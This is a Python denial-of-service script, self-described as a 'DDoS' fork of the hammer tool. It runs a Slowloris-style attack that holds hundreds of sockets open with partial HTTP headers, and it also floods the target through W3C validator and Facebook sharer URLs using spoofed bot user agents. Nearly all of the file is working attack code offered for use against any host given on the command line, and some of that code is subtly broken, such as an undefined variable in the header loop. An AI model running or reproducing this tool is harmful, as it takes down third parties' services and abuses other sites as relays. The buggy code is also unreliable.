#!/usr/bin/python3
# -*- coding: utf-8 -*-

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
import socket
import random
import time
import sys

log_level = 2

def log(text, level=1):
    if log_level >= level:
        print(text)

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

def init_socket(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((host,80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for header in regular_headers:
        s.send("{}\r\n".format(headers).encode("utf-8"))
    return s

def user_agent():
	global uagent
	uagent=[]
	uagent.append("uagent Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
	uagent.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)")
	uagent.append("CatchBot/2.0; +http://www.catchbot.com")
	uagent.append("GalaxyBot/1.0 (http://www.galaxy.com/galaxybot.html)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0; obot)")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("uagent=[]Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[1mBot is sending requests...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)

def local():
    socket_count = 200
    log("Attacking {} with {} sockets.".format(host, socket_count))

    log("Creating sockets...")
    for _ in range(socket_count):
        try:
            log("Creating socket nr {}".format(_), level=2)
            s = init_socket(host)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        log("Sending keep-alive headers... Socket count: {}".format(len(list_of_sockets)))
        for s in list_of_sockets:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)
        for i in range(socket_count - len(list_of_sockets)):
            log("Recreating socket...")
            try:
                s = init_socket(host)
                if s:
                    list_of_sockets.append(s)
            except:
                pass
        time.sleep(15)

def dos():
	while True:
		item = q.get()
		local()
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Python DDoS stuff by S3r1alPari4h (also a fork of hammer)
	Since this sends packet from the local computer also, your IP will be visible. \n
	usage : python3 hammer.py [-s] [-p] [-t]
	-h : help
	-s : server host or ip
	-p : port (default 80)
	-t : turbo default 135 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
